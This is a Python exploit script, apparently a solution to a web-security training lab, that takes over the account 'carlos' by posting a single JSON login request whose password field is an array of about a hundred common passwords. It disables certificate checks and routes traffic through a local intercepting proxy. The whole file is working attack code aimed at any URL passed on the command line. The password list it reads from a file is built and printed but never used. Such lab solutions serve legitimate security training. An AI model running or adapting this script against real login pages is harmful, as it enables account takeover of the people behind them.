import requests, sys, urllib3, json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def access_carlos_account(s, url):

    print("[+] Exploiting vulnerability....")
    login_url = url + "/login"
    #make passwordlist
    password_list = '['
    with open("Password.txt","r") as f:
        words = f.readlines()
    for word in words :
        word = word.rstrip("\n")
        password_list += '"' + word.rstrip("\n") + '",'
    password_list += '"amin"]'
    print(f"password list :\n\n {password_list} \n\n")
    payload = {"username": "carlos", "password":["123456", "password", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx", "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777", "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea", "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin", "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring", "montana", "moon", "moscow", "amin"]}
    headers = {"Content-Type": "application/json"}

    r = s.post(login_url, json=payload, headers=headers, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("[+] Successfully accessed Carlos's account.")
        print(r.headers)
    else:
        print("[-] Could not login to Carlos's account")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2 :
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    access_carlos_account(s, url)

if __name__ == "__main__":
    main()